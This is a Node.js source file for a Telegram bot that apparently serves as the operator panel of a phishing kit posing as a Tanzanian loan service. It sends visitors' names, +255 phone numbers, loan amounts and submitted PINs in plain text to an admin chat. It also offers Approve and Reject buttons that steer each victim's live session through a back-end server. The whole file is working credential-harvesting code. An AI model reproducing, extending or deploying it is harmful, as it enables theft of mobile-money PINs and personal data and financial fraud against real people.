const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');

// Configuration from Environment Variables
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_CHAT_ID;
const SERVER_URL = process.env.RENDER_EXTERNAL_URL;

if (!BOT_TOKEN || !SERVER_URL || !ADMIN_ID) {
    console.error("❌ MISSING CONFIG: Ensure BOT_TOKEN, ADMIN_CHAT_ID, and RENDER_EXTERNAL_URL are set.");
    process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

/**
 * Sends administrative decisions back to server.js
 */
async function sendDecisionToServer(socketId, action) {
    try {
        const referenceId = 'MIX-' + Math.random().toString(36).substr(2, 9).toUpperCase();
        await axios.post(`${SERVER_URL}/admin/action`, {
            socketId,
            action,
            referenceId
        });
        console.log(`Successfully sent [${action}] for socket ${socketId}`);
    } catch (error) {
        console.error("Error notifying server.js:", error.message);
    }
}

/**
 * Main Alert Logic
 * Handles both informational progress and actionable PIN approvals
 */
const sendAdminAlert = async (info) => {
    const { step, socketId, phoneNumber, pin, amount, loanType, firstName, lastName } = info;
    
    let message = `🚀 *User Activity Update*\n`;
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `📍 *Step:* ${step.replace(/_/g, ' ')}\n`;
    message += `🆔 *Socket:* \`${socketId}\`\n`;

    // Add dynamic data based on what is available
    if (firstName) message += `👤 *Name:* ${firstName} ${lastName || ''}\n`;
    if (phoneNumber) message += `📱 *Phone:* \`+255${phoneNumber}\`\n`;
    if (amount) message += `💰 *Amount:* TZS ${Number(amount).toLocaleString()}\n`;
    if (loanType) message += `📝 *Type:* ${loanType}\n`;
    
    // Highlight the PIN if provided
    if (pin) {
        message += `━━━━━━━━━━━━━━━━━━\n`;
        message += `🔑 *SUBMITTED PIN:* \`${pin}\`\n`;
        message += `━━━━━━━━━━━━━━━━━━\n`;
    }

    // Only Step 5 gets the action buttons
    const keyboard = (step === '5_PIN_SUBMITTED') 
        ? Markup.inlineKeyboard([
            [
                Markup.button.callback('✅ Approve', `approve_${socketId}`),
                Markup.button.callback('❌ Reject', `reject_${socketId}`)
            ]
        ])
        : null;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'Markdown',
            ...(keyboard || {})
        });
    } catch (err) {
        console.error("Telegram Send Error:", err.message);
    }
};

// --- Action Listeners ---

bot.action(/approve_(.+)/, async (ctx) => {
    const socketId = ctx.match[1];
    await sendDecisionToServer(socketId, 'approve');
    await ctx.answerCbQuery("Approved");
    await ctx.editMessageText(ctx.update.callback_query.message.text + "\n\n✅ *STATUS: APPROVED*", { parse_mode: 'Markdown' });
});

bot.action(/reject_(.+)/, async (ctx) => {
    const socketId = ctx.match[1];
    await sendDecisionToServer(socketId, 'reject');
    await ctx.answerCbQuery("Rejected");
    await ctx.editMessageText(ctx.update.callback_query.message.text + "\n\n❌ *STATUS: REJECTED*", { parse_mode: 'Markdown' });
});

// Startup
bot.launch().then(() => console.log("🤖 Bot Manager online and watching steps..."));

// Graceful shutdown
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

module.exports = { sendAdminAlert };